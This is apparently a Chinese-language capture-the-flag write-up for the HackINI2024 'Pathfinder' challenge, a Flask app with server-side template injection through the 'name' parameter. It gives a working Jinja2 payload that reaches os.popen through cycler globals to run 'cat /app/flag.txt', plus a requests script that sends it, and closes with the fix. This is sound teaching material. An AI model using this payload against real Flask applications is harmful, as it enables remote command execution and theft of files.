# HackINI2024 Pathfinder

## 题目简述

Flask 应用把查询参数 `name` 拼进模板字符串，再交给 `render_template_string()`。用户输入因此会被 Jinja2 作为模板语法执行，目标是从模板上下文到达 Python 全局对象并读取 `/app/flag.txt`。

## 解题过程

漏洞代码为：

```python
name = request.args.get("name")
template = f"<h1>- Hello {name}!</h1>"
return render_template_string(template)
```

先用简单表达式确认 SSTI：

```text
?name={{7*7}}
```

页面出现 `49`。Jinja2 默认全局对象 `cycler` 的初始化函数可访问模块全局字典，从中取得 `os` 并执行命令：

```jinja2
{{cycler.__init__.__globals__.os.popen('cat /app/flag.txt').read()}}
```

让客户端正确编码查询参数：

```python
import requests

payload = "{{cycler.__init__.__globals__.os.popen('cat /app/flag.txt').read()}}"
response = requests.get("http://TARGET/", params={"name": payload})
print(response.text)
```

渲染结果包含：

```text
shellmates{ohHh_God_i_foRGoOOoooOot_ABBBbBBBboUT_TemPPPpllaaATES}
```

## 方法总结

SSTI 的根因是把数据先拼成模板，再让模板引擎二次解释。正确做法是使用固定模板和变量参数，例如 `render_template("page.html", name=name)`，让自动转义处理数据。确认漏洞时先使用无副作用的算术表达式，再沿对象图定位可用全局对象，最后只执行读取 flag 所需的最小命令。
